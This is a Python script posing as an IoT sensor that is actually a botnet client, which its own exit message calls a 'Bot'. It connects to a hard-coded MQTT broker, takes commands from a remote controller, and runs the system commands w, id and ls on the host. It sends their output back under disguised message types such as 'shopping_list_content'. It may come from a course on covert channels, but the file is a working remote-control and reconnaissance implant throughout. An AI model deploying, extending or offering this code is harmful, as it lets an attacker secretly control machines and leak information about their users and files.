import os
import paho.mqtt.client as mqtt
import json
import time
import socket
import random
import subprocess

# Configuration
MQTT_BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
SENSOR_ID = "sensor_" + str(random.randint(1, 1000))


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"Sensor {SENSOR_ID} connected.")
        client.subscribe(TOPIC)
    else:
        print(f"Connection failed. Code: {rc}")


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())

        # Message for me?
        target = payload.get("sensor_id")
        if target != SENSOR_ID and target != "all":
            return

        sender = payload.get("sender_id")
        action = payload.get("action")
        params = payload.get("params")
        print(f"Received {action} from {sender}")

        if action == "announce":
            announce(client, sender)
        elif action == "w":
            logged_users(client, sender)
        elif action == "ls":
            get_content(client, sender, params if not params == {} else None)
        elif action == "id":
            id(client, sender)
        else:
            print(f"Unknown action: {action}")

    except json.JSONDecodeError:
        print("Received non-JSON message")
    except Exception as e:
        print(f"Error processing message: {e}")


# --- Announce ---
def announce(client, sender):
    response = {
        "controller_id": sender,
        "sender_id": SENSOR_ID,
        "type": "presence",
        "payload": f"{SENSOR_ID} - status: ONLINE, at: {socket.gethostname()}",
        "timestamp": time.time()
    }

    message = json.dumps(response)
    client.publish(TOPIC, message)
    print(f"Announced message: {message}")


# --- Logged users ---
def logged_users(client, sender):
    try:
        command = ['w']
        result = subprocess.run(command, capture_output=True, text=True, check=True).stdout.strip()

        response = {
            "controller_id": sender,
            "sender_id": SENSOR_ID,
            "type": "connected_users",
            "payload": result,
            "timestamp": time.time()
        }

        message = json.dumps(response)
        client.publish(TOPIC, message)
        print(f"Connected users message: {message}")
    except Exception as e:
        return f"An unexpected error occurred: {e}"


# --- Content ---
def get_content(client, sender, path=None):
    try:
        command = ['ls']
        if path:
            if not os.path.exists(path):
                return f"Error: The path '{path}' does not exist."
            command.append(path)

        result = subprocess.run(command, capture_output=True, text=True, check=True).stdout.strip()

        response = {
            "controller_id": sender,
            "sender_id": SENSOR_ID,
            "type": "shopping_list_content",
            "payload": result,
            "timestamp": time.time()
        }

        message = json.dumps(response)
        client.publish(TOPIC, message)
        print(f"Content message: {message}")

    except Exception as e:
        return f"An unexpected error occurred: {e}"


# --- ID ---
def id(client, sender):
    try:
        command = ['id']
        result = subprocess.run(command, capture_output=True, text=True, check=True).stdout.strip()

        response = {
            "controller_id": sender,
            "sender_id": SENSOR_ID,
            "type": "ping_with_id",
            "payload": result,
            "timestamp": time.time()
        }

        message = json.dumps(response)
        client.publish(TOPIC, message)
        print(f"Connected users message: {message}")

    except Exception as e:
        return f"An unexpected error occurred: {e}"


def main():
    client = mqtt.Client(client_id=SENSOR_ID)
    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(MQTT_BROKER, PORT, 60)
        client.loop_forever()
    except KeyboardInterrupt:
        print("Bot stopping...")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == '__main__':
    main()
